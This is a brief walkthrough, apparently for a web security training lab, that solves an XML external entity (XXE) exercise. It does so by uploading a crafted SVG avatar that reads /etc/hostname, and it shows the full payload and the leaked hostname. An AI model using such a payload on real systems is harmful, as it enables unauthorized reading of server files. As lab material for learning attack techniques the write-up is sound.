# Lab: Exploiting XXE via image file upload

Navigate to a blog post and fill in the comment submission section. Create a file called `hack.svg` with the following contents:
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

Upload the file as the commenter avatar and submit the comment.

Go back to the blog page and find the comment. Open the image of the comment avatar and see the hostname: `d3b3fca48663`

Submit the answer to solve the lab.